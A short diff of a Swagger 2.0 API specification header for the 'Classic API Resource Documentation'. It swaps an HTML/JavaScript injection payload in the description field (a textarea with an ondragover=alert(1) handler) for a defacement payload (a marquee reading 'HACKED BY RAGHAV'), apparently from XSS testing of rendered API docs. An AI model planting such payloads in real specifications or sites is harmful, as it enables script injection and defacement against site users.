@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: Classic API Resource Documentation
-  description: </div></p><div draggable="true" contenteditable>drag me</div><textarea ondragover=alert(1) contenteditable>drop here</textarea>
+  description: </div></p><marquee><h1>HACKED BY RAGHAV</h1></marquee>
   version: production
 basePath: /JSSResource/
 produces:
